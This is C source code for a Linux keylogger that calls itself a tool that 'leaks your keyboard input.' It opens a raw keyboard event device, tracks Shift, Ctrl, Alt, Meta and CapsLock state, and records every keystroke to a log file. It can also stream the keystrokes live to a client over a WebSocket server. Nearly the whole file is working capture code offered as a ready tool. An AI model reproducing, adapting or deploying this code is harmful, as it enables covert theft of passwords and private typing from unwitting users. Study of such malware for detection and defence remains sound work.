#include <fcntl.h>
#include <getopt.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "behavior_subject.h"
#include "keylogger.h"
#include "util.h"

#ifdef USE_LIBWEBSOCKETS
#include "websocket.h"
#endif

static volatile sig_atomic_t keep_running = true;
static bool printk_active = false;

void notify_key(const char *key) {
    if (strcmp(key, "SKIP") == 0) return;
    if (printk_active) printf("%s\n", key);
#ifdef USE_LIBWEBSOCKETS
    send_message_to_client(key);
#endif
}

void print_help() {
    printf("\n");
    printf("Keylogger for Linux. Leaks your keyboard input\n");
    printf("\n");
    printf("Usage   : keylogger <options?>\n");
    printf("Options :\n");
    printf("  --dev <path>     Specify the device event to use\n");
    printf("  --printk         Show keystrokes in terminal\n");
    printf("  --port <uint16>  Specify websocket port\n");
    printf("\n");
    printf("  -h, --help       Display help message\n");
    printf("\n");
}

void signal_handler() { keep_running = false; }

int main(int argc, char *argv[]) {
    const char *target_device_name = NULL;
#ifdef USE_LIBWEBSOCKETS
    uint16_t port = 33300;
#endif

    struct option keylogger_options[] = {
        {"dev",    required_argument, NULL, 0  },
#ifdef USE_LIBWEBSOCKETS
        {"port",   required_argument, NULL, 0  },
#endif
        {"printk", no_argument,       NULL, 0  },
        {"help",   no_argument,       NULL, 'h'},
        {0,        0,                 0,    0  }
    };

    int opt;
    int opt_index = 0;
    while ((opt = getopt_long(argc, argv, "h", keylogger_options, &opt_index)) != -1) {
        switch (opt) {
            case 'h':
                print_help();
                return EXIT_SUCCESS;
            case 0:
                if (opt_index == 0) target_device_name = optarg;
#ifdef USE_LIBWEBSOCKETS
                if (opt_index == 1) port = (uint16_t)atoi(optarg);
                if (opt_index == 2) printk_active = true;
#else
                if (opt_index == 1) printk_active = true;
#endif
                break;
            default:
                printf("Unknown option. Use -h or --help for help\n");
                return EXIT_FAILURE;
        }
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        printf("No keyboard device found");
        if (target_device_name) {
            printf(" with name: %s\n", target_device_name);
        } else {
            printf("[%d] There was an error\n", __LINE__);
        }
        return EXIT_FAILURE;
    }

    char *keyboard_name = get_keyboard_name(keyboard_path);
    if (keyboard_name) {
        printf("Using keyboard device: %s\n", keyboard_name);
        free(keyboard_name);
    } else {
        printf("Using keyboard device: %s\n", keyboard_path);
    }

    FILE *file = fopen(LOG_FILE, "w");
    if (!file) {
        printf("Cannot open log file\n");
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        printf("Cannot open keyboard device\n");
        fclose(file);
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    bool state_capslock_active = false;
    unsigned char led_status_bytes[(LED_MAX / 8) + 1] = {0};
    if (ioctl(fd, EVIOCGLED(sizeof(led_status_bytes)), led_status_bytes) == -1) {
        printf("Failed to get CapsLock LED status\n");
    } else {
        const int byte_index = LED_CAPSL / 8;
        const int bit_shift = LED_CAPSL % 8;
        state_capslock_active = (led_status_bytes[byte_index] & (1 << bit_shift)) != 0;
    }

    struct input_event event = {0};
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = state_capslock_active;

    BehaviorSubject subject;
    init_behavior_subject(&subject, "SKIP");
    subscribe(&subject, notify_key);

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

#ifdef USE_LIBWEBSOCKETS
    printf("Websocket listening on port: %d\n", port);
    printf(">>> You must set up a WebSocket client first for the keylogger to function properly.\n");
    if (init_websocket_server(port) != 0) {
        unsubscribe(&subject);
        close(fd);
        fclose(file);
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }
#endif

    char state_key_name[MAX_KEY_LEN];
    while (keep_running) {
#ifdef USE_LIBWEBSOCKETS
        lws_service(context, 0);
#endif
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Log modifier keys independently
                if (event.value == 1) {
                    if (event.code == KEY_CAPSLOCK) {
                        state_capslock_active = !state_capslock_active;
                        capslock_active = state_capslock_active;
                        snprintf(state_key_name, MAX_KEY_LEN, "CapsLock");
                        log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                    } else {
                        if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                            capslock_active = false;
                            snprintf(state_key_name, MAX_KEY_LEN, "Shift");
                        } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            snprintf(state_key_name, MAX_KEY_LEN, "Ctrl");
                        } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                            snprintf(state_key_name, MAX_KEY_LEN, "Meta");
                        } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                            snprintf(state_key_name, MAX_KEY_LEN, "Alt");
                        } else if (state_capslock_active) {
                            capslock_active = state_capslock_active;
                        }
                        if (state_key_name[0] != '\0') {
                            log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                        }
                        // Log other keys
                        const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                        if (strcmp(key_name, "UNKNOWN") != 0) {
                            char *tmp = mstrdup(state_key_name);
                            if (tmp) {
                                snprintf(state_key_name, MAX_KEY_LEN, "%s%s", tmp, key_name);
                                free(tmp);
                            } else {
                                snprintf(state_key_name, MAX_KEY_LEN, "%s", key_name);
                            }
                            log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                        }
                    }
                    memset(state_key_name, 0, sizeof(state_key_name));
                }
            }
        } else if (bytes_read == -1) {
            break;
        }
    }

    unsubscribe(&subject);
    close(fd);
    fclose(file);
    free(keyboard_path);

#ifdef USE_LIBWEBSOCKETS
    destroy_websocket_server();
#endif

    return EXIT_SUCCESS;
}
